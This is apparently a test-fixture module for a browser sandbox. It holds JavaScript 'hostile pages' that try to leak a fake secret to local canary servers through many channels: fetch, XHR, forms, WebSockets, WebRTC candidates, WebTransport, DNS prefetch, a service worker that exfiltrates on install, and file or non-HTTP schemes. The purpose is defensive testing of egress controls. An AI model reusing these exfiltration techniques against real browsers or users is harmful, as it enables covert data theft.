"""The hostile pages (`tests/test_hostile_pages.py`): for each way a page might
send data out, a page whose script tries the ways ADR-0026's amendment on
hostile pages lists, each attempt aimed at a canary of its own. Strings rather than files under
`tests/fixtures/pages/`: fallow (ADR-0018) analyzes every `.js` file outside
`bench/apps/`.

A page's script is an async function of its targets: `origin`, the allowed
origin it is served from; `tls`, an allowed https origin, for the QUIC page;
and, for each attempt, its canary's host as the page writes it and port, as
`host:port`. It returns what the page saw of each attempt, once every attempt
has settled."""

from dataclasses import dataclass, field
from typing import Literal

type Kind = Literal["tcp4", "tcp6", "udp4", "udp6"]


@dataclass(frozen=True)
class Target:
    """The canary an attempt aims at: TCP or UDP, on `127.0.0.1` or `::1`.
    `host` is how the page writes the canary's address when it isn't the
    plain one."""

    kind: Kind
    host: str | None = None


@dataclass(frozen=True)
class HostilePage:
    """What a page tries, against which canaries. `head` is the markup its
    head holds, `scripts` the other scripts its origin serves, by path, and
    `trusts_the_fixture` whether the browser must trust the fixture's
    certificate, for its https origin."""

    targets: dict[str, Target]
    script: str
    head: str = ""
    scripts: dict[str, str] = field(default_factory=dict)
    trusts_the_fixture: bool = False


# Helpers every page's script can use. Each attempt settles, whatever
# happens, so a page reports and never hangs.
PRELUDE = """
const settled = (promise, ms = 5000) => Promise.race([
    Promise.resolve(promise).then(() => "sent", (error) => `failed: ${error.name}`),
    new Promise((done) => setTimeout(() => done("timeout"), ms)),
]);
const hop = (t, url) => `${t.origin}/redirect?to=${encodeURIComponent(url)}`;
const xhr = (method, url) => new Promise((done, fail) => {
    const request = new XMLHttpRequest();
    request.onload = () => done();
    request.onerror = () => fail(new TypeError("the request failed"));
    request.open(method, url);
    request.send("data=fake-secret");
});
const socket = (url) => new Promise((done) => {
    const opened = new WebSocket(url);
    opened.onopen = () => done("open");
    opened.onerror = () => done("error");
    opened.onclose = () => done("closed");
    setTimeout(() => done("timeout"), 5000);
});
const socketInAWorker = (url) => new Promise((done) => {
    const code = `
        const opened = new WebSocket(${JSON.stringify(url)});
        opened.onopen = () => postMessage("open");
        opened.onerror = () => postMessage("error");
        opened.onclose = () => postMessage("closed");
    `;
    const worker = new Worker(
        URL.createObjectURL(new Blob([code], {type: "text/javascript"}))
    );
    worker.onmessage = (event) => done(event.data);
    setTimeout(() => done("timeout"), 5000);
});
const gather = async (iceServers) => {
    const peer = new RTCPeerConnection({iceServers});
    peer.createDataChannel("exfil");
    const candidates = [];
    peer.onicecandidate = (event) => {
        if (event.candidate) candidates.push(event.candidate.candidate);
    };
    await peer.setLocalDescription(await peer.createOffer());
    await new Promise((done) => {
        setTimeout(done, 5000);
        peer.onicegatheringstatechange = () => {
            if (peer.iceGatheringState === "complete") done();
        };
    });
    const gathering = peer.iceGatheringState;
    peer.close();
    return {candidates, gathering};
};
// A peer connection that negotiated with a second one, so it takes remote
// candidates, and the second.
const negotiated = async () => {
    const peer = new RTCPeerConnection();
    peer.createDataChannel("exfil");
    await peer.setLocalDescription(await peer.createOffer());
    const answerer = new RTCPeerConnection();
    await answerer.setRemoteDescription(peer.localDescription);
    await answerer.setLocalDescription(await answerer.createAnswer());
    await peer.setRemoteDescription(answerer.localDescription);
    return [peer, answerer];
};
// A target's address, without brackets, and port, as a candidate writes them.
const addressAndPort = (target) => {
    const at = target.lastIndexOf(":");
    return [target.slice(0, at).replace("[", "").replace("]", ""), target.slice(at + 1)];
};
const post = (action) => new Promise((done) => {
    const frame = document.createElement("iframe");
    frame.name = `target-${Math.random()}`;
    document.body.append(frame);
    const form = document.createElement("form");
    form.method = "post";
    form.action = action;
    form.target = frame.name;
    const field = document.createElement("input");
    field.name = "data";
    field.value = "fake-secret";
    form.append(field);
    document.body.append(form);
    frame.onload = () => done("settled");
    setTimeout(() => done("timeout"), 5000);
    form.submit();
});
const framed = (url) => new Promise((done) => {
    const frame = document.createElement("iframe");
    frame.onload = () => done("settled");
    setTimeout(() => done("timeout"), 3000);
    frame.src = url;
    document.body.append(frame);
});
const navigated = (url) => new Promise((done) => {
    const frame = document.createElement("iframe");
    document.body.append(frame);
    frame.onload = () => done("settled");
    setTimeout(() => done("timeout"), 3000);
    try {
        frame.contentWindow.location.href = url;
    } catch (error) {
        done(`refused: ${error.name}`);  // a URL no location takes
    }
});
"""

TCP4, TCP6, UDP4, UDP6 = Target("tcp4"), Target("tcp6"), Target("udp4"), Target("udp6")

PAGES = {
    "fetch": HostilePage(
        {"direct": TCP4, "hop": TCP4},
        """async (t) => ({
            direct: await settled(fetch(`http://${t.direct}/exfil?data=fake-secret`)),
            hop: await settled(fetch(hop(t, `http://${t.hop}/exfil?data=fake-secret`))),
        })""",
    ),
    "xhr": HostilePage(
        {"direct": TCP4, "hop": TCP4},
        """async (t) => ({
            direct: await settled(xhr("POST", `http://${t.direct}/exfil`)),
            hop: await settled(xhr("POST", hop(t, `http://${t.hop}/exfil`))),
        })""",
    ),
    "form_post": HostilePage(
        {"direct": TCP4, "hop": TCP4},
        """async (t) => ({
            direct: await post(`http://${t.direct}/exfil`),
            hop: await post(hop(t, `http://${t.hop}/exfil`)),
        })""",
    ),
    "websocket": HostilePage(
        {"page": TCP4, "worker": TCP4, "stream": TCP4},
        """async (t) => ({
            page: await socket(`ws://${t.page}/exfil`),
            worker: await socketInAWorker(`ws://${t.worker}/exfil`),
            stream: await settled(new WebSocketStream(`ws://${t.stream}/exfil`).opened),
        })""",
    ),
    "webrtc": HostilePage(
        {"stun": UDP4, "turn_udp": UDP4, "turn_tcp": TCP4},
        """async (t) => ({
            gathered: await gather([
                {urls: `stun:${t.stun}`},
                {
                    urls: `turn:${t.turn_udp}?transport=udp`,
                    username: "fake-user",
                    credential: "fake-secret",
                },
                {
                    urls: `turn:${t.turn_tcp}?transport=tcp`,
                    username: "fake-user",
                    credential: "fake-secret",
                },
            ]),
        })""",
    ),
    # Remote candidates the page writes itself, at address literals: a
    # browser checks connectivity to each, with no STUN or TURN server.
    "webrtc_remote": HostilePage(
        {"udp": UDP4, "tcp": TCP4, "udp6": UDP6, "tcp6": TCP6},
        """async (t) => {
            const [peer, answerer] = await negotiated();
            const lines = {
                udp: [1, "udp", "typ host"],
                tcp: [2, "tcp", "typ host tcptype passive"],
                udp6: [3, "udp", "typ host"],
                tcp6: [4, "tcp", "typ host tcptype passive"],
            };
            const outcomes = {};
            for (const [name, [id, protocol, kind]] of Object.entries(lines)) {
                const [address, port] = addressAndPort(t[name]);
                const candidate =
                    `candidate:${id} 1 ${protocol} 2122260223 ${address} ${port} ${kind}`;
                outcomes[name] = await settled(
                    peer.addIceCandidate({candidate, sdpMid: "0", sdpMLineIndex: 0})
                );
            }
            await new Promise((done) => setTimeout(done, 3000));
            peer.close();
            answerer.close();
            return outcomes;
        }""",
    ),
    "quic": HostilePage(
        # The allowed https origin answers with `Alt-Svc: h3` naming the
        # `http3` canary's port, which a browser that speaks QUIC to it
        # would send its next requests to.
        {"webtransport": UDP4, "http3": UDP4},
        """async (t) => {
            const outcomes = {
                webtransport: await settled(
                    new WebTransport(`https://${t.webtransport}/exfil`).ready
                ),
            };
            for (const each of [1, 2, 3, 4]) {
                outcomes[`https-${each}`] = await settled(
                    fetch(`${t.tls}/again-${each}`, {mode: "no-cors"})
                );
                await new Promise((done) => setTimeout(done, 300));
            }
            return outcomes;
        }""",
        trusts_the_fixture=True,
    ),
    "ipv6": HostilePage(
        {
            "loopback": TCP6,
            # IPv4-mapped: it reaches 127.0.0.1's canary.
            "mapped": Target("tcp4", "[::ffff:7f00:1]"),
            "hop": TCP6,
            "worker": TCP6,
            "stun": UDP6,
        },
        """async (t) => ({
            loopback: await settled(fetch(`http://${t.loopback}/exfil`)),
            mapped: await settled(fetch(`http://${t.mapped}/exfil`)),
            hop: await settled(fetch(hop(t, `http://${t.hop}/exfil`))),
            worker: await socketInAWorker(`ws://${t.worker}/exfil`),
            gathered: await gather([{urls: `stun:${t.stun}`}]),
        })""",
    ),
    "dns_prefetch": HostilePage(
        {"prefetch": TCP4, "preconnect": TCP4},
        """async (t) => {
            const link = (rel, href) => new Promise((done) => {
                const element = document.createElement("link");
                element.rel = rel;
                element.href = href;
                element.onload = () => done("loaded");
                element.onerror = () => done("failed");
                setTimeout(() => done("timeout"), 2000);
                document.head.append(element);
            });
            return {
                prefetch: await link("prefetch", `http://${t.prefetch}/exfil`),
                preconnect: await link("preconnect", `http://${t.preconnect}`),
            };
        }""",
        # Names only the egress proxy could resolve: a browser that looked
        # them up itself would send a DNS query.
        head="""
            <link rel="dns-prefetch" href="//dns-prefetch.example.test">
            <link rel="preconnect" href="https://preconnect.example.test">
            <link rel="preconnect" href="http://preconnect.example.test:8080">
        """,
    ),
    "service_worker": HostilePage(
        {"worker": TCP4},
        """async (t) => {
            const attempt = async (register) => {
                try {
                    return (await register()) ? "registered" : "no registration";
                } catch (error) {
                    return `refused: ${error.name}`;
                }
            };
            const script = `/sw.js?to=${encodeURIComponent(t.worker)}`;
            return {
                plain: await attempt(() => navigator.serviceWorker.register(script)),
                prototype: await attempt(() =>
                    ServiceWorkerContainer.prototype.register.call(
                        navigator.serviceWorker, script
                    )
                ),
                registrations: (await navigator.serviceWorker.getRegistrations()).length,
            };
        }""",
        # The worker the page would register: it sends to the canary named
        # in its URL as soon as it installs.
        scripts={
            "/sw.js": """
                const to = new URL(location.href).searchParams.get("to");
                self.addEventListener("install", (event) => {
                    event.waitUntil(fetch(`http://${to}/exfil?data=fake-secret`));
                });
            """,
        },
    ),
    "non_http_schemes": HostilePage(
        {"ftp": TCP4, "gopher": TCP4, "custom": TCP4, "file": TCP4},
        """async (t) => {
            const urls = {
                ftp: `ftp://${t.ftp}/exfil`,
                gopher: `gopher://${t.gopher}/exfil`,
                custom: `aqa-exfil://${t.custom}/exfil`,
                file: "file:///etc/hosts",
                fileOnAHost: `file://${t.file}/exfil`,
                chrome: "chrome://version",
            };
            const outcomes = {};
            for (const [name, url] of Object.entries(urls)) {
                outcomes[name] = await settled(fetch(url));
            }
            // Side by side: a refused frame fires no load, so each waits out
            // its timeout.
            await Promise.all(
                Object.values(urls).flatMap((url) => [framed(url), navigated(url)])
            );
            return outcomes;
        }""",
    ),
}
